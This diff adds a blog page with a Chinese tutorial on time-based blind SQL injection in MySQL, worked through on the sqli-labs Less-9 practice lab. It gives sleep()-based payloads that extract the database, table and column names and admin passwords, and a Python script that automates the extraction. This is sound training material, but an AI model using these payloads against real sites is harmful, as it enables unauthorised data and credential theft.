@@ -1,0 +1,467 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>xssong17</title>
+<meta name="description" content="我等着，等着你" />
+<link rel="shortcut icon" href="https://xssong17.github.io/favicon.ico?v=1730294755423">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
+
+<link rel="stylesheet" href="https://xssong17.github.io/styles/main.css">
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main px-4 flex flex-col lg:flex-row">
+      <div id="sidebar" class="sidebar-wrapper lg:static lg:w-1/4">
+  <div class="lg:sticky top-0">
+    <div class="sidebar-content">
+      <div class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
+        <i class="ri-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
+        <a href="https://xssong17.github.io">
+          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="https://xssong17.github.io/images/avatar.png?v=1730294755423" alt="">
+        </a>
+        <h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl" style="animation-delay: 0.2s">xssong17</h1>
+      </div>
+      
+        <div class="animated fadeInLeft" style="animation-delay: 0.4s">
+          <p class="my-4 text-gray-600 font-light hidden lg:block">
+            文章目录
+          </p>
+          <div class="toc-container hidden lg:block">
+            <ul class="markdownIt-TOC">
+<li><a href="#mysql%E6%89%8B%E6%B3%A8%E4%B9%8B%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8">MySQL手注之延时盲注(基于时间的盲注)</a>
+<ul>
+<li><a href="#%E5%8E%9F%E7%90%86">原理</a></li>
+<li><a href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83">实验环境</a></li>
+<li><a href="#%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0">常见函数</a></li>
+<li><a href="#%E5%AE%9E%E8%B7%B5">实践</a>
+<ul>
+<li><a href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90">源码分析</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4">步骤</a>
+<ul>
+<li><a href="#1-%E5%88%A4%E6%96%AD%E6%98%AF%E9%83%BD%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5">1、判断是都存在注入</a>
+<ul>
+<li><a href="#%E6%8F%92%E6%9B%B2">插曲</a></li>
+</ul>
+</li>
+<li><a href="#2-%E5%88%A4%E6%96%AD%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7">2、判断当前用户</a></li>
+<li><a href="#3-%E6%8B%86%E8%A7%A3%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D">3、拆解数据库名</a>
+<ul>
+<li><a href="#%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%9A%84%E9%95%BF%E5%BA%A6">判断数据库名的长度</a></li>
+<li><a href="#%E6%8B%86%E8%A7%A3%E5%85%B7%E4%BD%93%E5%AD%97%E7%AC%A6">拆解具体字符</a></li>
+</ul>
+</li>
+<li><a href="#4-%E6%8B%86%E8%A7%A3%E8%A1%A8%E5%90%8D">4、拆解表名</a>
+<ul>
+<li><a href="#%E5%88%A4%E6%96%AD%E8%A1%A8%E6%A0%BC%E6%95%B0%E9%87%8F">判断表格数量</a></li>
+<li><a href="#%E5%88%A4%E6%96%AD%E8%A1%A8%E5%90%8D%E9%95%BF%E5%BA%A6">判断表名长度</a></li>
+<li><a href="#%E6%8B%86%E8%A7%A3%E5%85%B7%E4%BD%93%E5%AD%97%E7%AC%A6-2">拆解具体字符</a></li>
+</ul>
+</li>
+<li><a href="#5-%E6%8B%86%E8%A7%A3%E5%88%97%E5%90%8D">5、拆解列名</a>
+<ul>
+<li><a href="#%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0">判断列数</a></li>
+<li><a href="#%E5%88%A4%E6%96%AD%E5%88%97%E5%90%8D%E9%95%BF%E5%BA%A6">判断列名长度</a></li>
+<li><a href="#%E5%88%A4%E6%96%AD%E5%85%B7%E4%BD%93%E5%AD%97%E7%AC%A6">判断具体字符</a></li>
+</ul>
+</li>
+<li><a href="#6-%E6%8B%86%E8%A7%A3%E6%95%B0%E6%8D%AE">6、拆解数据</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E9%99%84%E5%BD%95python3%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%AC">附录：python3时间注入脚本</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+<div class="menu-container">
+  <i class="ri-arrow-left-line text-2xl cursor-pointer animated fadeIn close-menu-btn" onclick="closeMenu()"></i>
+  <div>
+    
+      
+        <a href="/" class="menu" style="animation-delay: 0s">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu" style="animation-delay: 0.2s">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu" style="animation-delay: 0.4s">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu" style="animation-delay: 0.6000000000000001s">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="site-footer">
+    <div class="py-4 text-gray-700">Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a></div>
+    <a class="rss" href="https://xssong17.github.io/atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+<div class="mask" onclick="closeMenu()">
+</div>
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">MySQL手注之延时盲注(基于时间的盲注)</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2021-04-16 / 6 min read
+        </div>
+        
+        <div class="post-content yue">
+          <h1 id="mysql手注之延时盲注基于时间的盲注">MySQL手注之延时盲注(基于时间的盲注)</h1>
+<blockquote>
+<p>参考文章：https://www.cdxy.me/?p=789</p>
+<p>https://www.cnblogs.com/forforever/p/13019703.html</p>
+<p>https://my.oschina.net/u/4615518/blog/4554203</p>
+<p><a href="https://www.cnblogs.com/joker-vip/p/12698962.html">绕过姿势</a></p>
+</blockquote>
+<h2 id="原理">原理</h2>
+<p>将延时作为判断依据，判断相关的信息</p>
+<h2 id="实验环境">实验环境</h2>
+<p>sqli-libs-Less-9</p>
+<h2 id="常见函数">常见函数</h2>
+<ul>
+<li>
+<p>if(Condition,A,B) ：如果Condition成⽴，则A，否则B</p>
+</li>
+<li>
+<p>substr函数</p>
+</li>
+<li>
+<p>ascii函数</p>
+</li>
+<li>
+<p>延迟函数</p>
+<ul>
+<li>
+<p>mysql&gt;=5.0 使⽤sleep()进⾏查询</p>
+<pre><code>id=1 and sleep(5)
+</code></pre>
+</li>
+<li>
+<p>mysql&lt;5.0使⽤benchmark()进⾏查询</p>
+<p>benchmark是通过查询次数增多，时间变得缓慢来判断是否存在延迟</p>
+<pre><code>select benchmark(1000,select * from admin);
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="实践">实践</h2>
+<p>关键性源码</p>
+<pre><code>if(isset($_GET['id']))
+{
+$id=$_GET['id'];
+//logging the connection parameters to a file for analysis.
+$fp=fopen('result.txt','a');
+fwrite($fp,'ID:'.$id.&quot;\n&quot;);
+fclose($fp);
+
+// connectivity 
+
+
+$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
+$result=mysql_query($sql);
+$row = mysql_fetch_array($result);
+
+	if($row)//无论row存在与否，返回内容都是一致的
+	{
+  	echo 'You are in...........';
+  	}
+	else 
+	{
+	echo 'You are in...........';
+	//print_r(mysql_error());
+	//echo &quot;You have an error in your SQL syntax&quot;;	
+	
+	}
+}
+	else { echo &quot;Please input the ID as parameter with numeric value&quot;;}
+</code></pre>
+<h3 id="源码分析">源码分析</h3>
+<p>这里我们可以看到，无论我们输入什么，返回的内容都是一样的</p>
+<p>无法用联合查询，因为没有回显点，返回的内容都是一样的</p>
+<p>无法使用布尔查询，因为无论真假，返回都是一致的，不会返回给你真假（数据的存在与否等）</p>
+<p>这里，如果我们将else里的解注释掉，那么这里就可以使用布尔盲注了，因为这样我们就可以以问话的形式，进行询问（数据库名长度为1吗？假；长度为2吗？真；第一个是“a”吗？假；……）</p>
+<pre><code>print_r(mysql_error());
+echo &quot;You have an error in your SQL syntax&quot;;
+</code></pre>
+<h3 id="步骤">步骤</h3>
+<h4 id="1-判断是都存在注入">1、判断是都存在注入</h4>
+<pre><code>1' and sleep(5)--+
+</code></pre>
+<pre><code>SELECT * FROM users WHERE id='1' and sleep(5)--+' LIMIT 0,1;
+</code></pre>
+<p>如果加载了5s，那么说明存在注入</p>
+<h5 id="插曲">插曲</h5>
+<p>在本地测试语句的时候，犯了低级失误</p>
+<pre><code>select * from users and sleep(5);# 这样是有语法错误的
+</code></pre>
+<p>可以这样，使用union</p>
+<pre><code>select * from users union select 1,2,3,sleep(5);# 当然需要保证union select个数正确
+</code></pre>
+<p>更简单的可以这样，这样每查询一条，就会休眠1s，假如条数多就真的休眠了QAQ</p>
+<pre><code>select sleep(1) from users;
+</code></pre>
+<p>突发奇想，这样是不是可以通过休眠的时间判断相关的信息的数量，感觉有点蠢。</p>
+<p>以上仅为测试过程中发现的好玩的东西~</p>
+<h4 id="2-判断当前用户">2、判断当前用户</h4>
+<pre><code>and if(ascii(substr(user(),1,1))=114,sleep(5),1)
+</code></pre>
+<h4 id="3-拆解数据库名">3、拆解数据库名</h4>
+<h5 id="判断数据库名的长度">判断数据库名的长度</h5>
+<pre><code>1' and if(length(database())=8,sleep(5),1)--+
+</code></pre>
+<h5 id="拆解具体字符">拆解具体字符</h5>
+<pre><code>1' and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)--+
+</code></pre>
+<h4 id="4-拆解表名">4、拆解表名</h4>
+<h5 id="判断表格数量">判断表格数量</h5>
+<pre><code>1' and if((select count(table_name) from information_schema.tables where table_schema=database())=n,sleep(5),1)--+
+</code></pre>
+<h5 id="判断表名长度">判断表名长度</h5>
+<pre><code>1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit n-1,1),num,1))&gt;guess_ascii--+
+</code></pre>
+<h5 id="拆解具体字符-2">拆解具体字符</h5>
+<pre><code>1' and if(ascii(substr((SELECT distinct concat(table_name) FROM information_schema.tables
+where table_schema=database() LIMIT 0,1),1,1))=116,sleep(5),1)--+
+</code></pre>
+<h4 id="5-拆解列名">5、拆解列名</h4>
+<h5 id="判断列数">判断列数</h5>
+<pre><code>1' and (select count(column_name) from information_schema.columns where table_name= 'admin')=n --+
+</code></pre>
+<h5 id="判断列名长度">判断列名长度</h5>
+<pre><code>1' and length(substr((select column_name from information_schema.columns where table_name= 'admin' limit n-1,1),1))=guess_length --+
+</code></pre>
+<h5 id="判断具体字符">判断具体字符</h5>
+<pre><code>1' and if(ascii(substr((select column_name from information_schema.columns where
+table_name='admin' limit,0,1),1,1))&gt;100,sleep(5),1)--+
+</code></pre>
+<h4 id="6-拆解数据">6、拆解数据</h4>
+<pre><code>1' and if(ascii(substr((select password from admin limit 0,1),1,1))&gt;100,sleep(5),1)--+
+</code></pre>
+<p>……</p>
+<h2 id="附录python3时间注入脚本">附录：python3时间注入脚本</h2>
+<pre><code># encoding=utf-8
+
+# 时间盲注脚本
+import requests
+import time
+import datetime
+
+
+# 获取数据库长度
+def database_len():
+    # 存放跑出的结果
+    length = 0
+    database = ''
+    print(&quot;start get length...&quot;)
+    guess_max_length = 15
+
+    for l in range(1, guess_max_length + 1):
+
+        startTime1 = time.time()
+
+        url1 = &quot;http://127.0.0.1/sqli-lab/Less-9/?id=1' and if(length(database())=%d,sleep(2),1)--+&quot; % (l)
+
+        response1 = requests.get(url1)
+
+        if time.time() - startTime1 &gt; 1:
+            length += l
+
+    print(&quot;the length :&quot;, str(length))
+
+    # break
+
+    return length
+
+
+# database_len()
+# 获取数据库名
+def database_name(data_len):
+    print(&quot;start database sql injection...&quot;)
+    name = ''
+    for j in range(1, data_len + 1):
+        for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_':
+            url = '''http://127.0.0.1/sqli-lab/Less-9/'''
+            payload = '''?id=1' and if(substr(database(),%d,1)='%s',sleep(2),1)''' % (
+                j, i)
+            # print(url+payload+'--+')
+            time1 = datetime.datetime.now()
+            res = requests.get(url + payload + '--+')
+            time2 = datetime.datetime.now()
+            sec = (time2 - time1).seconds
+            if sec &gt;= 2:
+                name += i
+                print(name)
+                break
+    print('database_name:', name)
+
+
+data_len = database_len()
+
+database_name(data_len)
+
+</code></pre>
+<p>可能存在误差~</p>
+
+        </div>
+
+        
+          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="https://xssong17.github.io/tag/wgo_p-85C/">
+            <span class="flex-auto">渗透</span>
+          </a>
+        
+
+
+        <div class="flex justify-between py-8">
+          
+            <div class="prev-post">
+              <a href="https://xssong17.github.io/post/mysql-shou-zhu-zhi-root-quan-xian-chu-li/">
+                <h3 class="post-title">
+                  <i class="ri-arrow-left-line"></i>
+                  MySQL手注之Root权限处理
+                </h3>
+              </a>
+            </div>
+          
+
+          
+            <div class="next-post">
+              <a href="https://xssong17.github.io/post/mysql-shou-zhu-zhi-bu-er-xing-mang-zhu/">
+                <h3 class="post-title">
+                  MySQL手注之布尔型盲注
+                  <i class="ri-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+
+        
+
+      </div>
+    </div>
+
+    <script src="https://xssong17.github.io/media/prism.js"></script>  
+<script>
+
+Prism.highlightAll()
+let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+// This should probably be throttled.
+// Especially because it triggers during smooth scrolling.
+// https://lodash.com/docs/4.17.10#throttle
+// You could do like...
+// window.addEventListener("scroll", () => {
+//    _.throttle(doThatStuff, 100);
+// });
+// Only not doing it here to keep this Pen dependency-free.
+
+window.addEventListener("scroll", event => {
+  let fromTop = window.scrollY;
+
+  mainNavLinks.forEach((link, index) => {
+    let section = document.getElementById(decodeURI(link.hash).substring(1));
+    let nextSection = null
+    if (mainNavLinks[index + 1]) {
+      nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+    }
+    if (section.offsetTop <= fromTop) {
+      if (nextSection) {
+        if (nextSection.offsetTop > fromTop) {
+          link.classList.add("current");
+        } else {
+          link.classList.remove("current");    
+        }
+      } else {
+        link.classList.add("current");
+      }
+    } else {
+      link.classList.remove("current");
+    }
+  });
+});
+
+
+document.addEventListener("DOMContentLoaded", function() {
+  var lazyImages = [].slice.call(document.querySelectorAll(".post-feature-image.lazy"));
+
+  if ("IntersectionObserver" in window) {
+    let lazyImageObserver = new IntersectionObserver(function(entries, observer) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          let lazyImage = entry.target
+          lazyImage.style.backgroundImage = `url(${lazyImage.dataset.bg})`
+          lazyImage.classList.remove("lazy")
+          lazyImageObserver.unobserve(lazyImage)
+        }
+      });
+    });
+
+    lazyImages.forEach(function(lazyImage) {
+      lazyImageObserver.observe(lazyImage)
+    })
+  } else {
+    // Possibly fall back to a more compatible method here
+  }
+});
+
+const menuContainer = document.querySelector('.menu-container')
+const menus = document.querySelectorAll('.menu-container .menu')
+const mask = document.querySelector('.mask')
+const contentWrapper = document.querySelector('.content-wrapper')
+const latestArticle = document.querySelector('.latest-article')
+const readMore = document.querySelector('.read-more')
+const indexPage = document.querySelector('.index-page')
+
+const isHome = location.pathname === '/'
+if (latestArticle) {
+  latestArticle.style.display = isHome ? 'block' : 'none'
+  readMore.style.display = isHome ? 'block' : 'none'
+  indexPage.style.display = isHome ? 'none' : 'block'
+}
+
+const openMenu = () => {
+  menuContainer.classList.add('open')
+  menus.forEach(menu => {
+    menu.classList.add('animated', 'fadeInLeft')
+  })
+  mask.classList.add('open')
+  contentWrapper.classList.add('is-second')
+}
+
+const closeMenu = () => {
+  menuContainer.classList.remove('open')
+  menus.forEach(menu => {
+    menu.classList.remove('animated', 'fadeInLeft')
+  })
+  mask.classList.remove('open')
+  contentWrapper.classList.remove('is-second')
+}
+</script>
+  
+  </body>
+</html>
